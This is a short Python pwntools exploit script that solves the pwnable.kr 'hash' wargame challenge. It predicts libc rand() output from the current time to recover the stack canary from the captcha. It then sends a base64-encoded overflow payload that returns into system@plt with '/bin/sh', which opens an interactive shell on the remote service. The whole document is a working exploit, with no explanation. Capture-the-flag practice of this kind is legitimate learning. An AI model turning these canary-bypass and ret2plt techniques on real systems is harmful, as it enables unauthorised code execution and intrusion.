#/usr/bin/python
from pwn import *
import base64
from ctypes import *
from ctypes.util import find_library 

#libc = cdll.Loadlibrary(find_library('c'))
libc = CDLL(find_library('c'))
libc.srand(libc.time(0))
array = [ libc.rand() for i in range(8)]

#context.log_level = 'debug'
r = process('./hash')
r = remote('pwnable.kr', 9002)

system_plt = 0x8048880
g_bufs = 0x804b0e0 + 0x2d0

r.recvuntil('captcha : ')
recv = int(r.recvline()[:-1])
r.sendline(str(recv))
canary = (recv - array[4] + array[6] - array[7] - array[2] + array[3] - array[1] - array[5]) & 0xffffffff;
success('canary = '+hex(canary))
r.recvuntil('Encode your data with BASE64 then paste me!\n')

payload = ''
payload += 'A'*(0x200)
payload += p32(canary)
payload += 'BBBB'*3
payload += p32(system_plt)
payload += 'BBBB'
payload += p32(g_bufs)

#gdb.attach(r, 'b* 0x8048da8')
r.sendline(base64.encodestring(payload).replace('\n', '')+'/bin/sh'+'\x00')

r.interactive()